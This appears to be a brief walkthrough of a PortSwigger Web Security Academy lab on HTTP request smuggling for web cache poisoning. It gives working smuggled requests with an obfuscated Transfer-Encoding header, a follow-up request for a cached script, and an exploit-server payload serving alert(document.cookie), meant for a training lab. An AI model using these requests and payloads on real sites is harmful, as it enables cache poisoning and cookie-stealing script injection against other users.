Exploiting HTTP request smuggling to perform web cache poisoning

As usual, this will take a number of attempts. The solution provided works well, in theory. Here are the requests that worked for me:

POST / HTTP/1.1
Host: ac0c1f4e1eefd64480b43998008e0097.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning
Connection: close
Cookie: session=1PCMrapuYEsIXAdyC6zbHONvrsQUhvMj
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 179
Transfer-Encoding: 	chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: acd31f911efad68e800d396d014d0022.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1 

The GET request (don't forget carriage return!)

GET /resources/js/tracking.js HTTP/1.1
Host: ac0c1f4e1eefd64480b43998008e0097.web-security-academy.net
Connection: close 



The exploit server payload:

File:
/post

Head:
HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8

Body:
alert(document.cookie)



Send the main post request a bunch of times. Stop on a 200 response. Try the GET request and see if you got a 302 response. If you did, try reloading the main page. (https://ac0c1f4e1eefd64480b43998008e0097.web-security-academy.ne)
You should get a redirect and an XSS and hopefully the lab complete prompt if the fake user did that too. If it didn't work, try again. 
Smuggling is not an exact science.